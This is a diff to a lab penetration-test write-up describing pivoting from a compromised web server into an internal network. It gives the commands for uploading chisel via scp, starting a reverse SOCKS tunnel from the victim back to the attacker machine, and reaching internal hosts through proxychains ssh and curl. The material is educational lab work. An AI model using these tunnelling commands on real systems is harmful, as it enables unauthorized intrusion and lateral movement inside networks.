@@ -1,7 +1,17 @@
 Kindly Note that the test carried out in this lab environment  was a gray box test, meaning that some information was provided, and oin situations where these information were not provided, alternates methods wwould be used
 e.g credentials of the compromised webserver
 
-# PART A - Enumeration to Pivoting
+# PART A : Enumeration 
+
+
+
+# PART B - Enumerating the Compromised webserver to Pivoting into the internal network 
+Tools used in this section includes
+   a. ssh for remote access to the compromised server
+   b. curl: to access the websiite on the webserver
+   c. chisel: 
+   d. proxychains: To help 
+   d. xfred
 
 ## Enumeration
 This is the act of getting information from a target, and in this environment, an active recon was done
@@ -29,7 +39,26 @@ This is the act of getting information from a target, and in this environment, a
 
 ## Pivoting
 
-Pivoting is the act of moving through different sections of  netwworks. in this environment, pivoting worked 
+Pivoting is the act of moving through different sections of  netwworks. in this environment, pivoting worked by using the attacker's machine on 192.168.10.42 to connecct to internal services running on 10.10.10.21 via the compromised server running on 192.168.10.247 and 10.10.10.17
+
+A tool called chisel  in combination with proxychains were used here.
+1. Sending the chisel tool to the compromisedd web server: This was done using the command "scp chisel ah01crt@192.168.10.247:/tmp
+![image](https://github.com/user-attachments/assets/af642470-46e9-4e7a-8339-edebeca10a3d)
+
+2. Running Chisel: After chisel hass been sent to the tmp direectory on the compromised web server, the tool was started on both the attaer machine and the compromised server
+         a. Attacker machine:chisel server --socks5 --reverse 
+![image](https://github.com/user-attachments/assets/4f68d466-73f3-4302-aeb4-b45da1e8daa5)
+         b. on the victim machine:  ./chisel client --fingerprint pqh2eK8bDpDPiMPeTx8dAd+N0/lF9cVxo5ZoVwz8yRs= 192.168.10.42:8080 R:socks
+![image](https://github.com/user-attachments/assets/8e1eb033-e00b-4636-ba96-2a6f61056be7)
+
+3. Confirming chisel's workings: To confirm that the tool is working and we can indeed connct to the internal network,
+         a. connecting to the compromised webserver via SSH using thee internal network of the server: using the command  proxychains ssh ah01crt@10.10.10.17
+   This worked and it is a prove that we can connect to the internal network
+   ![image](https://github.com/user-attachments/assets/e281081b-f397-4985-85a8-336b885ca95e)
+         b. Connecting to the webserver's website via the internal Ip: using the command  proxychains curl 10.10.10.17  
+   ![image](https://github.com/user-attachments/assets/90d02adc-8822-4ee4-85ea-2234099a6504)
+
+4. Accessing services on the 10.10.10.21 host: Since this host runs a remote desktop service, the service was tried 
 
 
 ![image](https://github.com/user-attachments/assets/571a35c4-fe87-4075-bbe5-c80ec69c8944)
